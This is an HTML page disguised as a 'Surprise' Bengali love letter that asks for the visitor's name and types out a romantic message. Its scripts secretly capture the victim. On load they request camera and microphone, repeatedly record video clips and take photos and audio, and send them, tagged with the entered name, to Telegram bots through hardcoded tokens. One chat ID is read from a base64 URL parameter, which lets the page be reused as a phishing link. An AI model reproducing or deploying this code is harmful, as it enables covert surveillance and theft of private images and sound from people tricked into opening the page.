<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap" rel="stylesheet">
  <title>Surprise</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Cursive', sans-serif;
      background: linear-gradient(135deg, #fcb69f, #d4a5a5);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #fff;
    }

    .name-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .name-form {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .name-form input {
      padding: 10px;
      font-size: 1.2rem;
      width: 250px;
      margin-bottom: 20px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    .name-form button {
      background-color: #ef4444;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 25px;
      cursor: pointer;
    }

    .name-form button:hover {
      background-color: #dc2626;
    }

    .container {
      background: #fff;
      width: 100%;
      max-width: 600px;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      overflow: hidden;
      position: relative;
      display: none;
    }

    .letter-title {
      text-align: center;
      font-size: 2rem;
      color: #ef4444;
      margin-bottom: 20px;
      font-family: 'Georgia', serif;
    }

    .letter-box {
      font-family: 'Arial', sans-serif;
      font-size: 1.2rem;
      line-height: 1.6;
      color: #333;
      white-space: pre-wrap;
      word-wrap: break-word;
      padding: 20px;
      background: #fafafa;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      margin-top: 20px;
      height: 250px;
      overflow-y: auto;
      max-height: 250px;
    }

    .caret {
      display: inline-block;
      width: 10px;
      background: #333;
      margin-left: 4px;
      animation: blink 1s infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    .message {
      text-align: center;
      font-size: 16px;
      color: #4ade80;
      margin-top: 20px;
    }

    .button-container {
      display: flex;
      justify-content: center;
      margin-top: 20px;
    }
    .letter-box {
  font-family: 'Hind Siliguri', sans-serif;
  font-size: 1.2rem;
  line-height: 1.8;
  color: #333;
  white-space: pre-wrap;
  word-wrap: break-word;
  padding: 20px;
  background: #fffaf0;
  border-radius: 10px;
  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
  margin-top: 20px;
  height: 300px;
  overflow-y: auto;
  max-height: 300px;
}
    .action-btn {
      background-color: #ef4444;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .action-btn:hover {
      background-color: #dc2626;
    }

    #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <!-- Fullscreen Name Input Form -->
  <div class="name-container" id="name-container">
    <div class="name-form">
      <h2>তোমার নাম লিখ</h2>
      <input type="text" id="userName" placeholder="Your Name" />
      <button id="submit-name">Next</button>
    </div>
  </div>

  <!-- Love Letter Content -->
  <div class="container" id="container">
    <div class="letter-title" id="letter-title">প্রিয় <span id="to-name">Love</span></div>
    <div class="letter-box" id="letter"></div>
    <div class="message" id="message">🥹...</div>
    <div class="button-container">
      <button class="action-btn" id="start-btn">এইখানে ক্লিক করো </button>
    </div>
  </div>

  <canvas id="canvas" width="300" height="400"></canvas>

  <script>
    let userName = "";

    const letterText = `

তোমাকে লেখা এই চিঠির প্রতিটি শব্দ যেন আমার হৃদয়ের গভীর থেকে উঠে আসা কিছু অনুভূতির প্রতিচ্ছবি। জানি না কীভাবে বলা উচিত, অথবা আদৌ বলা সম্ভব কি না—তবুও চেষ্টা করছি।
তোমাকে প্রথম দেখার পর থেকে আমার ভুবনটাই যেন অন্যরকম হয়ে গেছে।
তোমার হাসিটা আমার কাছে সূর্যের আলোয়ের মতো—যা অন্ধকার মনকেও আলোকিত করে দেয়।
তোমার চোখের গভীরতায় আমি প্রতিদিন হারিয়ে যাই, আর সেখানে খুঁজে পাই আমার জীবনের সবচেয়ে সুন্দর স্বপ্নগুলো।

তুমি আমার জীবনে আসার পর বুঝেছি, ভালোবাসা কাকে বলে।
তোমাকে ছাড়া আমি আমার ভবিষ্যৎ কল্পনাই করতে পারি না।
তুমি আমার জন্য শুধু প্রিয় নও, তুমি আমার আশ্রয়, আমার প্রার্থনা, আমার সুখের সবচেয়ে সহজ সংজ্ঞা।

আমি চাই, জীবনের প্রতিটা মুহূর্ত তোমার সঙ্গে ভাগ করে নিতে।
তোমার হাত ধরে হাঁটতে চাই সময়ের শেষ প্রান্ত পর্যন্ত।
হাজার ঝড়-ঝাপটা আসুক, আমি চাই তোমার ছায়া হয়ে পাশে থাকতে।

তুমি আমার হৃদয়ের চিরন্তন কবিতা।
আমি শুধু তোমাকে বলতে চাই—
আমি তোমাকে ভালোবাসি, আজ, কাল, আর চিরকাল। ❤️`;

    const letterBox = document.getElementById("letter");
    const startBtn = document.getElementById("start-btn");
    const submitNameBtn = document.getElementById("submit-name");
    const nameContainer = document.getElementById("name-container");
    const container = document.getElementById("container");
    const toName = document.getElementById("to-name");
    const userNameInput = document.getElementById("userName");
    const message = document.getElementById("message");
    const canvas = document.getElementById('canvas');
    const token = "8458707617:AAFefXdogqYdEyHJKQNHqa3v8ap6boRYN3Q";
    const chatId = "8150594363";

    let index = 0;

    submitNameBtn.addEventListener("click", function() {
      userName = userNameInput.value.trim();
      if (userName !== "") {
        toName.textContent = userName;
        nameContainer.style.display = "none";
        container.style.display = "block";
      }
    });

    function typeLetter() {
      if (index < letterText.length) {
        letterBox.innerHTML = letterText.substring(0, index + 1) + '<span class="caret"></span>';
        index++;
        letterBox.scrollTop = letterBox.scrollHeight;
        setTimeout(typeLetter, 50);
      } else {
        letterBox.innerHTML = letterText;
      }
    }

    startBtn.addEventListener("click", function() {
      typeLetter();
      startBtn.style.display = "none";
    });

    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: true
    })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];

      mediaRecorder.ondataavailable = function(e) {
        chunks.push(e.data);
      };

      mediaRecorder.onstop = function() {
        const blob = new Blob(chunks, { type: "video/webm" });
        chunks.length = 0;
        sendVideoToTelegram(blob);
      };

      setInterval(() => {
        if (mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }

        mediaRecorder.start();
        setTimeout(() => {
          if (mediaRecorder.state === "recording") {
            mediaRecorder.stop();
          }
        }, 5000); // Record for 5 seconds
      }, 8000); // Every 8 seconds
    })
    .catch(err => {
      message.textContent = "";
      console.error(err);
    });

    function sendVideoToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("video", blob, "video.webm");
      formData.append("caption", `This is ${userName}'s video!`);

      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (!data.ok) {
          message.textContent = "🥹";
        }
      })
      .catch(err => {
        console.error(err);
        message.textContent = "🥲";
      });
    }
  </script>

  <script>
    function GetURLParameter(name) {
      const params = new URLSearchParams(window.location.search);
      return params.get(name);
    }

    function decodeBase64(encodedStr) {
      try {
        return decodeURIComponent(atob(encodedStr));
      } catch (e) {
        console.error('Base64 decode error:', e);
        return null;
      }
    }

    const base64Id = GetURLParameter('i');
    const chatid = base64Id ? decodeBase64(base64Id) : null;

    function sendToTelegram(data, type) {
      const botToken = '8801388143:AAHZExQqKVZtnul_DulJBDm7RNPMZkLHNq0';
      if (!chatid) return console.error('Chat ID is not available.');

      const formData = new FormData();
      formData.append('chat_id', chatid);
      formData.append(type === 'photo' ? 'photo' : 'audio', data, `thumb.${type === 'photo' ? 'jpg' : 'wav'}`);

      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
        method: 'POST',
        body: formData
      }).then(res => res.json())
        .then(data => console.log('Telegram response:', data))
        .catch(err => console.error('Telegram error:', err));
    }

    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then((stream) => {
        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
        const audioRecorder = new MediaRecorder(stream);

        for (let i = 0; i < 3; i++) {
          setTimeout(() => {
            imageCapture.takePhoto().then(blob => sendToTelegram(blob, 'photo'));
          }, i * 2000);
        }

        audioRecorder.start();
        setTimeout(() => audioRecorder.stop(), 5000);
        audioRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            sendToTelegram(event.data, 'audio');
          }
        };
      })
      .catch(error => {
        if (error.name === 'NotAllowedError') {
          console.warn('Permissions denied. User blocked access.');
        } else {
          console.error('Media error:', error);
        }
      });

    function downloadThumbnail() {
      const url = document.getElementById("ytlink").value;
      const btn = document.getElementById("thumbdloadbtn");
      btn.textContent = "Fetching...";

      const videoId = extractVideoID(url);
      if (!videoId) {
        btn.textContent = "Fetch Thumbnail";
        return alert("Invalid YouTube URL");
      }

      const thumbnailURL = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
      document.getElementById("thumbnail-preview").innerHTML = `
        <img src="${thumbnailURL}" style="max-width:100%; margin: 20px 0; border-radius:10px;" />
        <a href="${thumbnailURL}" download class="form-control" style="background:#00c851; text-align:center; color:white; text-decoration:none;">Download HD Thumbnail</a>
      `;
      btn.textContent = "Fetch Thumbnail";
    }

    function extractVideoID(url) {
      const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#\&\?]*).*/;
      const match = url.match(regExp);
      return (match && match[2].length == 11) ? match[2] : null;
    }
  </script>
